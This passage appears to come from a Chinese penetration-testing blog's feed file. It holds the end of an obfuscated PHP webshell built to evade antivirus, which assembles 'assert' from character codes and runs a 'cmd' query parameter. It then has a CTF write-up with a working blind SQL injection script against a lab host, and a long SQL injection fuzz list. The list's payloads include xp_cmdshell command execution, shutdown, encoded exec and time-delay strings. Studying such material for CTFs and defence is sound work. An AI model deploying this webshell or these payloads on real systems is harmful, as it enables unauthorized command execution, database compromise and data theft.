class="hljs-variable">$v</span>)&#123;<br><span class="hljs-variable">$asse</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ass_arr</span>, <span class="hljs-variable">$asse</span>);<br>&#125;<br><span class="hljs-variable">$assss</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$ass_arr</span>);<br><span class="hljs-variable">$assss</span>(<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-title function_ invoke__">gg</span>(<span class="hljs-string">&quot;cmd&quot;</span>)));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gg</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$a</span>];<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span>&gt;<span class="hljs-number">10</span>)&#123;<br><span class="hljs-variable">$i</span> +=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-variable">$ass</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;97&quot;</span>,<span class="hljs-string">&quot;115&quot;</span>,<span class="hljs-string">&quot;115&quot;</span>,<span class="hljs-string">&quot;101&quot;</span>,<span class="hljs-string">&quot;114&quot;</span>,<span class="hljs-string">&quot;116&quot;</span>);<br><span class="hljs-title function_ invoke__">ch</span>(<span class="hljs-variable">$ass</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>文件上传</tag>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[渗透测试] SQL注入绕waf</title>
    <link href="/2022/12/13/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20sql%E6%B3%A8%E5%85%A5%E7%BB%95waf/"/>
    <url>/2022/12/13/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20sql%E6%B3%A8%E5%85%A5%E7%BB%95waf/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入绕waf"><a href="#sql注入绕waf" class="headerlink" title="sql注入绕waf"></a>sql注入绕waf</h1><p>[SQL注入一些过滤及绕过总结_devil8123665的博客-CSDN博客_sql注入过滤](<a href="https://blog.csdn.net/devil8123665/article/details/108746947#:~:text=SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7">https://blog.csdn.net/devil8123665/article/details/108746947#:~:text=SQL注入绕过技巧</a> 1.绕过空格（注释符%2F* *%2F，%a0）：,2.括号绕过空格： 3.引号绕过（使用十六进制）： 4.逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）：)</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>sql注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] CISCN2019-华北赛区-Day2-Web1-HackWorld</title>
    <link href="/2022/12/13/%5Bctf-web%5D%20CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-HackWorld/"/>
    <url>/2022/12/13/%5Bctf-web%5D%20CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-HackWorld/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>SQL注入，输入<code>1</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221213193038524.png" alt="image-20221213193038524"></p><p>输入<code>2</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221213193053151.png" alt="image-20221213193053151"></p><p>输入<code>1&#39;</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221213193117125.png" alt="image-20221213193117125"></p><p>经过测试发现过滤了一些东西，fuzz看看，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221213193829261.png" alt="image-20221213193829261"></p><p>空格也被过滤了，最后使用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-attribute">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>盲注，使用脚本跑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>s=requests.session()<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#123;-abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:<br>        url=<span class="hljs-string">&quot;http://558a8fd2-099b-4f26-a605-7266af099f84.node4.buuoj.cn:81/index.php&quot;</span><br>        sqls=<span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sqls&#125;<br>        c = s.post(url,data=data,timeout=<span class="hljs-number">100</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello&#x27;</span> <span class="hljs-keyword">in</span> c.text:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><p>不要跑太快，否则会又一些字符消失，这个结果好像没有<code>-</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221213194047387.png" alt="image-20221213194047387"></p><p>自己添加<code>-</code>就行了</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;c16886eb-<span class="hljs-number">16b4</span>-<span class="hljs-number">4e08</span>-aefa-<span class="hljs-number">05fd8a6259d</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[渗透测试] SQL注入fuzz字典</title>
    <link href="/2022/12/13/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20sql%E6%B3%A8%E5%85%A5fuzz%E5%AD%97%E5%85%B8/"/>
    <url>/2022/12/13/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20sql%E6%B3%A8%E5%85%A5fuzz%E5%AD%97%E5%85%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入fuzz字典"><a href="#sql注入fuzz字典" class="headerlink" title="sql注入fuzz字典"></a>sql注入fuzz字典</h1><h2 id="字典2"><a href="#字典2" class="headerlink" title="字典2"></a>字典2</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&quot;</span><br><span class="hljs-string">#</span><br><span class="hljs-string">-</span><br><span class="hljs-string">--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-comment">--</span><br><span class="hljs-comment">--&#x27;;</span><br><span class="hljs-string">&#x27; ;</span><br><span class="hljs-string">= &#x27;</span><br><span class="hljs-operator">=</span> ;<br><span class="hljs-operator">=</span> <span class="hljs-comment">--</span><br>\x23<br>\x27<br>\x3D \x3B<span class="hljs-string">&#x27;</span><br><span class="hljs-string">\x3D \x27</span><br><span class="hljs-string">\x27\x4F\x52 SELECT *</span><br><span class="hljs-string">\x27\x6F\x72 SELECT *</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span><br>admin<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">&#x27;</span>;shutdown<span class="hljs-comment">--</span><br><span class="hljs-operator">&lt;&gt;</span>&quot;&#x27;%;)(&amp;+<br>&#x27; or &#x27;&#x27;=&#x27;<br>&#x27; or &#x27;x&#x27;=&#x27;x<br>&quot; <span class="hljs-keyword">or</span> &quot;x&quot;<span class="hljs-operator">=</span>&quot;x<br>&#x27;) or (&#x27;x&#x27;=&#x27;x<br>0 or 1=1<br>&#x27; or 0=0 --<br>&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-comment">--</span><br><span class="hljs-keyword">or</span> <span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; or 0=0 #</span><br><span class="hljs-string">&quot; or 0=0 #</span><br><span class="hljs-string">or 0=0 #</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--</span><br>&quot; or 1=1--<br>&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--<br>&quot;<span class="hljs-string">&#x27; or 1 --&#x27;</span>&quot;<br>or 1=1--<br>or%201=1<br>or%201=1 --<br>&#x27; or 1=1 or &#x27;&#x27;=&#x27;<br>&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> &quot;&quot;<span class="hljs-operator">=</span>&quot;<br>&#x27; or a=a--<br>&quot; <span class="hljs-keyword">or</span> &quot;a&quot;<span class="hljs-operator">=</span>&quot;a<br>&#x27;) or (&#x27;a&#x27;=&#x27;a<br>&quot;) <span class="hljs-keyword">or</span> (&quot;a&quot;<span class="hljs-operator">=</span>&quot;a<br>hi&quot; <span class="hljs-keyword">or</span> &quot;a&quot;<span class="hljs-operator">=</span>&quot;a<br>hi&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>hi<span class="hljs-string">&#x27; or 1=1 --</span><br><span class="hljs-string">hi&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;a</span><br><span class="hljs-string">hi&#x27;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;a</span><br><span class="hljs-string">hi&quot;) or (&quot;a&quot;=&quot;a</span><br><span class="hljs-string">&#x27;</span>hi<span class="hljs-string">&#x27; or &#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>x<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">@variable</span><br><span class="hljs-string">,@variable</span><br><span class="hljs-string">PRINT</span><br><span class="hljs-string">PRINT @@variable</span><br><span class="hljs-string">select</span><br><span class="hljs-string">insert</span><br><span class="hljs-string">as</span><br><span class="hljs-string">or</span><br><span class="hljs-string">procedure</span><br><span class="hljs-string">limit</span><br><span class="hljs-string">order by</span><br><span class="hljs-string">asc</span><br><span class="hljs-string">desc</span><br><span class="hljs-string">delete</span><br><span class="hljs-string">update</span><br><span class="hljs-string">distinct</span><br><span class="hljs-string">having</span><br><span class="hljs-string">truncate</span><br><span class="hljs-string">replace</span><br><span class="hljs-string">like</span><br><span class="hljs-string">handler</span><br><span class="hljs-string">bfilename</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> uname <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> userid <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> uid <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">exec xp</span><br><span class="hljs-string">exec sp</span><br><span class="hljs-string">&#x27;</span>; <span class="hljs-keyword">exec</span> master..xp_cmdshell<br><span class="hljs-string">&#x27;; exec xp_regread</span><br><span class="hljs-string">t&#x27;</span><span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;nslookup www.google.com&#x27;</span><span class="hljs-comment">--</span><br><span class="hljs-comment">--sp_password</span><br>\x27UNION <span class="hljs-keyword">SELECT</span><br><span class="hljs-string">&#x27; UNION SELECT</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span><br><span class="hljs-string">&#x27; or (EXISTS)</span><br><span class="hljs-string">&#x27;</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span><br><span class="hljs-string">&#x27;||UTL_HTTP.REQUEST</span><br><span class="hljs-string">1;SELECT%20*</span><br><span class="hljs-string">to_timestamp_tz</span><br><span class="hljs-string">tz_offset</span><br><span class="hljs-string">&amp;lt;&amp;gt;&amp;quot;&#x27;</span><span class="hljs-operator">%</span>;)(<span class="hljs-operator">&amp;</span>amp;<span class="hljs-operator">+</span><br><span class="hljs-string">&#x27;%20or%201=1</span><br><span class="hljs-string">%27%20or%201=1</span><br><span class="hljs-string">%20$(sleep%2050)</span><br><span class="hljs-string">%20&#x27;</span>sleep<span class="hljs-operator">%</span><span class="hljs-number">2050</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">char%4039%41%2b%40SELECT</span><br><span class="hljs-string">&amp;apos;%20OR</span><br><span class="hljs-string">&#x27;</span>sqlattempt1<br>(sqlattempt2)<br><span class="hljs-operator">|</span><br><span class="hljs-operator">%</span><span class="hljs-number">7</span>C<br><span class="hljs-operator">*</span><span class="hljs-operator">|</span><br><span class="hljs-operator">%</span><span class="hljs-number">2</span>A<span class="hljs-operator">%</span><span class="hljs-number">7</span>C<br><span class="hljs-operator">*</span>(<span class="hljs-operator">|</span>(mail<span class="hljs-operator">=</span><span class="hljs-operator">*</span>))<br><span class="hljs-operator">%</span><span class="hljs-number">2</span>A<span class="hljs-operator">%</span><span class="hljs-number">28</span><span class="hljs-operator">%</span><span class="hljs-number">7</span>C<span class="hljs-operator">%</span><span class="hljs-number">28</span>mail<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-operator">%</span><span class="hljs-number">2</span>A<span class="hljs-operator">%</span><span class="hljs-number">29</span><span class="hljs-operator">%</span><span class="hljs-number">29</span><br><span class="hljs-operator">*</span>(<span class="hljs-operator">|</span>(objectclass<span class="hljs-operator">=</span><span class="hljs-operator">*</span>))<br><span class="hljs-operator">%</span><span class="hljs-number">2</span>A<span class="hljs-operator">%</span><span class="hljs-number">28</span><span class="hljs-operator">%</span><span class="hljs-number">7</span>C<span class="hljs-operator">%</span><span class="hljs-number">28</span>objectclass<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-operator">%</span><span class="hljs-number">2</span>A<span class="hljs-operator">%</span><span class="hljs-number">29</span><span class="hljs-operator">%</span><span class="hljs-number">29</span><br>(<br><span class="hljs-operator">%</span><span class="hljs-number">28</span><br>)<br><span class="hljs-operator">%</span><span class="hljs-number">29</span><br><span class="hljs-operator">&amp;</span><br><span class="hljs-operator">%</span><span class="hljs-number">26</span><br><span class="hljs-operator">!</span><br><span class="hljs-operator">%</span><span class="hljs-number">21</span><br><span class="hljs-string">&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27; or &#x27;&#x27;=&#x27;</span><br>x<span class="hljs-string">&#x27; or 1=1 or &#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>y<br><span class="hljs-operator">/</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><span class="hljs-operator">/</span><span class="hljs-comment">/*</span><br><span class="hljs-comment">*/</span><span class="hljs-operator">*</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">AnD</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">aND</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; and 2&gt;1--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">2</span><span class="hljs-operator">&gt;</span><span class="hljs-number">3</span><span class="hljs-comment">--</span><br><span class="hljs-string">&#x27;) and (&#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>x<br>) <span class="hljs-keyword">and</span> (<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-string">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;or&#x27;</span><br>a<span class="hljs-string">&#x27; or 1=1--</span><br><span class="hljs-string">&quot;a&quot;&quot; or 1=1--&quot;</span><br><span class="hljs-string"> or a = a</span><br><span class="hljs-string">a&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a</span><br><span class="hljs-string">1 or 1=1</span><br><span class="hljs-string">a&#x27;</span> waitfor delay <span class="hljs-string">&#x27;0:0:10&#x27;</span><span class="hljs-comment">--</span><br><span class="hljs-number">1</span> waitfor delay <span class="hljs-string">&#x27;0:0:10&#x27;</span><span class="hljs-comment">--</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@q</span> nvarchar (<span class="hljs-number">200</span>) <span class="hljs-keyword">select</span> <span class="hljs-variable">@q</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@q</span>)<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@s</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">200</span>) <span class="hljs-keyword">select</span> <span class="hljs-variable">@s</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x77616974666F722064656C61792027303A303A31302700</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@s</span>) <br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@q</span> nvarchar (<span class="hljs-number">200</span>) <span class="hljs-number">0x730065006c00650063007400200040004000760065007200730069006f006e00</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@q</span>)<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@s</span> <span class="hljs-type">varchar</span> (<span class="hljs-number">200</span>) <span class="hljs-keyword">select</span> <span class="hljs-variable">@s</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x73656c65637420404076657273696f6e</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@s</span>)<br>a<span class="hljs-string">&#x27;</span><br><span class="hljs-string">?</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br>‘ <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>x<span class="hljs-string">&#x27; AND userid IS NULL; --</span><br><span class="hljs-string">x&#x27;</span> <span class="hljs-keyword">AND</span> email <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>; <span class="hljs-comment">--</span><br>anything<span class="hljs-string">&#x27; OR &#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>x<br>x<span class="hljs-string">&#x27; AND 1=(SELECT COUNT(*) FROM tabname); --</span><br><span class="hljs-string">x&#x27;</span> <span class="hljs-keyword">AND</span> members.email <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>; <span class="hljs-comment">--</span><br>x<span class="hljs-string">&#x27; OR full_name LIKE &#x27;</span><span class="hljs-operator">%</span>Bob<span class="hljs-operator">%</span><br><span class="hljs-number">23</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-string">&#x27;; exec master..xp_cmdshell &#x27;</span>ping <span class="hljs-number">172.10</span><span class="hljs-number">.1</span><span class="hljs-number">.255</span><span class="hljs-string">&#x27;--</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;%20or%20&#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;%20or%20&#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>x<br><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">or</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>x<span class="hljs-operator">=</span>x<br><span 